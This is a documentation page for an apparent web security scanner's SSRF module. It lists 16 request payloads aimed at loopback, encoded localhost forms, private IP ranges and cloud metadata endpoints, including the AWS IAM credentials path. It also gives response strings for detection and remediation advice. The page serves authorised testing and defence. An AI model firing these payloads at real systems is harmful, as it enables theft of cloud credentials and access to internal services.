---
title: "Module 13 · SSRF"
description: Server-Side Request Forgery testing against cloud IMDS endpoints and internal IP ranges.
---

# Module 13 · SSRF

**Flag:** `--skip-ssrf`

Tests 25 common URL parameters with 16 SSRF payloads targeting cloud metadata services and internal network ranges.

---

## Payloads

```
http://127.0.0.1/
http://127.0.0.1:22/
http://127.0.0.1:8080/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://2130706433/          # 127.0.0.1 decimal
http://0x7f000001/          # 127.0.0.1 hex
http://169.254.169.254/     # shared IMDS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/v1/
http://192.168.0.1/
http://10.0.0.1/
```

---

## Detection indicators

The response body is scanned for these strings to detect successful SSRF:

`ami-id` · `instance-id` · `availability-zone` · `iam` · `security-credentials` · `computeMetadata` · `root:` · `daemon:` · `mysql:` · `127.0.0.1` · `localhost` · `internal`

---

## Findings

| Condition | Severity |
|---|:---:|
| Internal/cloud-metadata content in response | <span class="sev sev-critical">CRITICAL</span> |
| No in-band SSRF detected | <span class="sev sev-info">INFO</span> |

!!! tip "Blind SSRF"
    In-band SSRF (where the response is returned directly) is what this module detects.
    **Blind SSRF** — where the server makes an out-of-band request — requires an external
    listener. Use Burp Collaborator or [Interactsh](https://github.com/projectdiscovery/interactsh)
    for blind SSRF testing.

---

## Remediation

- Validate and allowlist all outbound URL destinations
- Block access to IMDS from application containers (IMDSv2 on AWS, metadata server firewall on GCP/Azure)
- Use egress firewalling to prevent unexpected outbound connections

---

## Output files

```
misc/
└── ssrf_tests.txt
```
